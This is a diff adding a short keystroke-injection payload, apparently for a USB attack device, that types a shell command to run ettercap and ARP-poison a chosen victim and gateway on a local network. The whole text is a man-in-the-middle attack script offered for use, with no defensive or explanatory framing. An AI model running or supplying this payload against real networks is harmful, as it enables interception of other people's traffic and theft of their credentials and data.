@@ -1,0 +1,4 @@
+REM ARP poisoning / MITM on LAN with ettercap (text mode)
+DELAY 500
+STRING read -p "Interface (e.g. eth0): " i; read -p "Target IP (victim): " t; read -p "Gateway IP: " gw; sudo ettercap -T -i "$i" -M arp:remote "/$t//" "/$gw//" 2>/dev/null || echo "ettercap not installed. Run: sudo apt install ettercap-text-only"
+ENTER
